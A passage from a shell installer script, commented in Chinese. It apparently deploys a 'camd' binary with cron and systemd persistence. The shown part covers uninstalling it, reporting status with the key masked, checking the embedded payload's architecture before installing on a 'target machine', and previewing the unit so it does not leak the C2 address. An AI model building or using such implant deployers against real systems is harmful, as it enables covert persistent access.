    elif [ "$FAKE_ROOT" = 1 ]; then
        OK "假根模式：跳过 systemctl（不改动真实系统状态）"
    else
        OK "systemd 不可用，跳过"
    fi
    rm -f "$CRON" "$BIN_DST" "$LOCK"
    rm -rf "$CONF_DIR" "$LIB_DIR"
    OK "文件与二进制已清理"
    # 按 PID 精确杀，避免 pkill -f 自匹配。
    # 假根下**不杀**：comm 匹配区分不了"这个 camd 属于哪个根"，杀会误伤
    # 真实部署的常驻进程——那正是假根要隔离的东西。假根部署在守卫里用
    # --batches 1 跑完即退，本来也不留常驻进程。
    if [ "$FAKE_ROOT" = 1 ]; then
        WARN "假根模式：跳过按 comm 杀进程（无法区分归属，会误伤真实部署）"
    else
        for P in $(ps -eo pid=,comm= 2>/dev/null | awk '$2=="camd"{print $1}'); do
            kill -TERM "$P" 2>/dev/null
        done
        OK "进程已清理"
    fi
    return 0
}

do_status() {
    printf '配置: %s\n' "$([ -r "$CONF_FILE" ] && echo 存在 || echo 缺失)"
    [ -r "$CONF_FILE" ] && grep -c . "$CONF_FILE" >/dev/null 2>&1 \
        && sed 's/CAMD_KEY=.*/CAMD_KEY=<隐藏>/' "$CONF_FILE" 2>/dev/null
    printf '二进制: %s\n' "$([ -x "$BIN_DST" ] && echo 存在 || echo 缺失)"
    printf 'systemd 单元: %s\n' "$([ -f "$UNIT" ] && echo 存在 || echo 缺失)"
    printf 'cron 条目: %s\n' "$([ -f "$CRON" ] && echo 存在 || echo 缺失)"
    printf '运行进程: %s\n' "$(ps -eo comm= 2>/dev/null | grep -c '^camd$')"
    return 0
}

do_checkpayload() {
    # 只校验、不安装：在构建机/跳板上先验"这份包能不能在这台机器上跑"，
    # 避免在目标机上安装到一半才发现架构错配（那时已留下文件与驻留条目）。
    detect_arch
    OK "当前架构: $ARCH -> $ARCH_KEY"
    extract_bin
    rm -f "$TMPB" 2>/dev/null
    OK "分节齐全，e_machine 匹配，可以安装"
    return 0
}

case "$ACTION" in
    install)   do_install ;;
    uninstall) do_uninstall ;;
    status)    do_status ;;
    checkpayload) do_checkpayload ;;
    renderunit)
        # 只渲染 + 静态校验单元，不安装、不删除、不碰 systemctl。
        #
        # 为什么必须有这个子命令：do_install 里 render_unit 之后，凡判定
        # "不安装 systemd"（假根或 PID 1 非 systemd）都会 rm -f "$UNIT"。
        # 于是单元测试在非 systemd 环境**根本无从检查**——而单元内容恰恰
        # 是最该被静态校验的东西（是否含 Restart=always、是否泄露密钥与
        # C2 地址、Description 是否点明功能）。
        #
        # 用途二：部署前预览。单元是 0644 且常进配置管理，落盘前先看一眼
        # 比事后清理容易得多。
        [ -n "$PREFIX" ] || WARN "未指定 --prefix：单元将写入真实 /etc/systemd/system"
        render_unit || exit 1
        printf 'UNIT_PATH=%s\n' "$UNIT"
        [ "$UNIT_ERR" -eq 0 ] || exit 1
        ;;
esac
report
[ "$fail" -eq 0 ] || exit 1
exit 0

# PAYLOAD_BEGIN
# PAYLOAD_END
